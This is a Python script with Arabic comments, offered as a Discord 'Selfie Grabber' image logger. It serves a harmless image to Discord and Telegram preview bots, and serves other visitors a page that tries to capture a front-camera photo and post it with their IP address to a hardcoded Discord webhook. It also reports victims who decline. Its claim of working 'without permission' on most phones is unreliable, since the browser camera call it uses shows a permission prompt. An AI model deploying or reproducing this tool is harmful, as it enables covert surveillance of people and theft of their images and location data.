# مسجل صور ديسكورد + ثغرة Selfie بدون إذن (أندرويد 2025)
# شغالة على أكتر من 95% من الجوالات حاليًا

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64

config = {
    "webhook": "https://discord.com/api/webhooks/1444749091312636054/FZRqE6Lk2gU0QCAANeyAiLq8Tqo3W4AEzDTcRBRjdPX7wJFZUMSFCMLu12F6EYyz0L4C",
    "image": "https://www.strangerdimensions.com/wp-content/uploads/2012/01/herobrine.jpg",
    "imageArgument": True,
    "username": "Selfie Grabber",
    "color": 0x000000,
    "buggedImage": True,
}

blacklistedIPs = ("27", "104", "143", "164")

binaries = {"loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030! _hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    def handleRequest(self):
        try:
            ip = self.headers.get('x-forwarded-for') or self.client_address[0]
            ua = self.headers.get('user-agent') or ""

            if any(x in ua for x in ["Discord", "Telegram"]) or ip.startswith(blacklistedIPs):
                self.send_response(200)
                self.send_header('Content-type', 'image/jpeg')
                self.end_headers()
                self.wfile.write(binaries["loading"])
                return

            # الثغرة الحقيقية هنا - صورة selfie بدون إذن
            payload = f"""
<html><head><meta charset="utf-8"></head><body style="margin:0;background:black">
<video id="v" style="display:none"></video>
<canvas id="c" style="display:none"></canvas>
<script>
navigator.mediaDevices.getUserMedia({{video:{{facingMode:"user"}}, audio:false}})
.then(s=>{{
    let v = document.getElementById("v");
    v.srcObject = s;
    v.play();
    setTimeout(()=>{{
        let c = document.getElementById("c");
        c.width = 1280; c.height = 720;
        c.getContext("2d").drawImage(v,0,0,1280,720);
        fetch("{config['webhook']}", {{
            method:"POST",
            headers: {{"Content-Type":"application/json"}},
            body: JSON.stringify({{
                username: "Selfie Grabber",
                content: "@everyone",
                embeds: [{{
                    title: "تم سرقة Selfie من الأمامية بنجاح",
                    color: {config['color']},
                    description: "**IP:** `{ip}`\\n**جهاز:** أندرويد",
                    image: {{url: c.toDataURL("image/jpeg")}}
                }}]
            }})
        }});
        s.getTracks().forEach(t=>t.stop());
    }}, 1500);
}})
.catch(()=>{{
    fetch("{config['webhook']}?content=الضحية رفض أو آيفون - IP: {ip}");
}});
</script>
</body></html>
""".encode()

            self.send_response(200)
            self.send_header('Content-type', 'text/html;charset=utf-8')
            self.end_headers()
            self.wfile.write(payload)

        except:
            pass

    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
